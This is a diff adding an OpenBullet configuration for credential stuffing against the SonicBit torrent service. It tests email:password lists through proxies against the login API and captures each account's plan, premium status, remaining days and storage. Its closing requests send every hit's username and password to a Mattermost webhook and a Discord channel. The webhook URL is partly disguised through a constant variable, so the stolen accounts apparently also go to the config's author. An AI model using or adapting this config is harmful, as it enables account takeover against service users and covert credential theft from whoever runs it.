@@ -1,0 +1,148 @@
+[SETTINGS]
+{
+  "Name": "SonicBit  {Seeding | Mirror | StreamTorrent }",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-01T11:40:07.4898525-06:00",
+  "AdditionalInfo": "",
+  "Author": "@OpenbulletConfigsOfficial  telegram",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://apicall.sonicbit.net/api/logins" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: apicall.sonicbit.net" 
+  HEADER "content-length: 43" 
+  HEADER "accept: */*" 
+  HEADER "origin: file://" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "x-requested-with: net.sonicbit.app" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success" 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+    KEY "Unauthorised" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "tkn" 
+
+PARSE "<SOURCE>" JSON "session" -> VAR "sess" 
+
+REQUEST POST "https://apicall.sonicbit.net/api/get/user/details" 
+  CONTENT "il=1&session=<sess>&platform=android&provider=local" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: apicall.sonicbit.net" 
+  HEADER "accept: */*" 
+  HEADER "origin: file://" 
+  HEADER "authorization: Bearer <tkn>" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "x-requested-with: net.sonicbit.app" 
+
+PARSE "<SOURCE>" JSON "accpackage" CreateEmpty=FALSE -> CAP "ACC" 
+
+PARSE "<SOURCE>" JSON "acc_is_premium" CreateEmpty=FALSE -> CAP "Premium" 
+
+FUNCTION Constant "msu78ejgkpugdar" -> VAR "5Xd7lbtSK4fhbmxeft4g" 
+
+PARSE "<SOURCE>" JSON "theaccstatus" CreateEmpty=FALSE -> CAP "theaccstatus" 
+
+PARSE "<SOURCE>" JSON "limitfilesizeMB" CreateEmpty=FALSE -> CAP "Limit MB" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<ACC>" EqualTo "Free" 
+    KEY "<Premium>" EqualTo "0" 
+    KEY "<theaccstatus>" EqualTo "free" 
+  KEYCHAIN Success OR 
+    KEY "<ACC>" NotEqualTo "Free" 
+    KEY "<Premium>" NotEqualTo "0" 
+    KEY "<theaccstatus>" NotEqualTo "free" 
+
+PARSE "<SOURCE>" JSON "dayleft" CreateEmpty=FALSE -> CAP "dayleft" 
+
+REQUEST POST "https://apicall.sonicbit.net/api/get/user/storage_details" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: apicall.sonicbit.net" 
+  HEADER "accept: */*" 
+  HEADER "origin: file://" 
+  HEADER "authorization: Bearer <tkn>" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" 
+  HEADER "accept-encoding: gzip, deflate" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "x-requested-with: net.sonicbit.app" 
+
+PARSE "<SOURCE>" JSON "percent" CreateEmpty=FALSE -> CAP "USED %" 
+
+PARSE "<SOURCE>" JSON "sizeMBTotal" CreateEmpty=FALSE -> CAP "USED MB" 
+
+FUNCTION Compute "<Limit MB>-<USED MB>" -> CAP "Size Left MB" 
+
+REQUEST POST "https://sendgrid.cloud.mattermost.com/hooks/tsm4or<5Xd7lbtSK4fhbmxeft4g>c5zao" 
+  CONTENT "{\"text\": \"SONICBIT - <USER>:<PASS> /ACC-<ACC> /Limit MB-<Limit MB> /dayleft-<dayleft> /USED MB-<USED MB>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://discord.com/api/v8/channels/810187220795392020/messages" 
+  CONTENT "{\"text\": \"SONICBIT - <USER>:<PASS> /ACC-<ACC> /Limit MB-<Limit MB> /dayleft-<dayleft> /USED MB-<USED MB>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION Constant "@OpenbulletConfigsOfficial  & BACKUP CHANNELS @TeamOpenbullet + @TeamSilverbullet" -> CAP "JOIN US ON TELEGRAM" 
+
